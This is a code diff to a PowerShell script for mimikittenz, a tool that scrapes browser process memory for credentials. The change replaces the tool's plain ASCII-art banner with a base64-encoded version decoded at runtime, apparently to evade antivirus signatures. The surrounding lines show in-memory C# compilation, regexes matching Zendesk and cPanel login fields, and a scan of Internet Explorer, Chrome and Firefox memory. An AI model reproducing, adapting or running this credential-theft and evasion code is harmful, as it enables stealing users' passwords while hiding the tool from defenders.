@@ -24,25 +24,7 @@ Depending on each process cleanup, process generally must be running in order to
 
 
 $asciiart = @"
-
-                                          
-───▐▀▄──────▄▀▌───▄▄▄▄▄▄▄─────────────
-───▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄──────────
-──▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄────────
-──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄──────
-▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
-▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐───▄▄
-▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█
-▐▒▒▒▒mimikittenz-1.0-alpha▒▒▒▒▒▒▒▒▒▐▒█▀─
-▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀───
-▐▒▒▒▒▒▒CAN I HAZ WAM?▒▒▒▒▒▒▒▒▒▒▒▒▌────
-─▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐─────
-─▐▒▒▒jamieson@dringensec.com▒▒▒▒▌─────
-──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐──────
-──▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌──────
-────▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀────────
-
-
+4pSA4pSA4pSA4paQ4paA4paE4pSA4pSA4pSA4pSA4pSA4pSA4paE4paA4paM4pSA4pSA4pSA4paE4paE4paE4paE4paE4paE4paE4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQrilIDilIDilIDilozilpLilpLiloDiloTiloTiloTiloTiloDilpLilpLilpDiloTiloDiloDilpLilojilojilpLilojilojilpLiloDiloDiloTilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCuKUgOKUgOKWkOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWgOKWhOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0K4pSA4pSA4paM4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paE4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paA4paE4pSA4pSA4pSA4pSA4pSA4pSADQriloDilojilpLilpLilojilozilpLilpLilojilpLilpLilpDilojilpLilpLiloDilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilozilIDilIDilIDilIDilIANCuKWgOKWjOKWkuKWkuKWkuKWkuKWkuKWgOKWkuKWgOKWkuKWkuKWkuKWkuKWkuKWgOKWgOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKWhOKWhA0K4paQ4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paM4paE4paI4paS4paIDQrilpDilpLilpLilpLilpJtaW1pa2l0dGVuei0xLjAtYWxwaGHilpLilpLilpLilpLilpLilpLilpLilpLilpLilpDilpLilojiloDilIANCuKWkOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKWgOKUgOKUgOKUgA0K4paQ4paS4paS4paS4paS4paS4paSQ0FOIEkgSEFaIFdBTT/ilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilozilIDilIDilIDilIANCuKUgOKWjOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKUgOKUgA0K4pSA4paQ4paS4paS4paSamFtaWVzb25AZHJpbmdlbnNlYy5jb23ilpLilpLilpLilpLilozilIDilIDilIDilIDilIANCuKUgOKUgOKWjOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKUgOKUgOKUgA0K4pSA4pSA4paQ4paE4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paE4paM4pSA4pSA4pSA4pSA4pSA4pSADQrilIDilIDilIDilIDiloDiloTiloTiloDiloDiloDiloDiloTiloTiloDiloDiloDiloDiloDiloDiloTiloTiloDiloDiloDiloDiloDiloDiloTiloTiloDilIDilIDilIDilIDilIDilIDilIDilIA=
 "@
 $Source2 = @"
 using System;
@@ -546,7 +528,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
     #Cpanel
     [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
-write-output $asciiart
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
 $matches=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
 
 write-output $matches
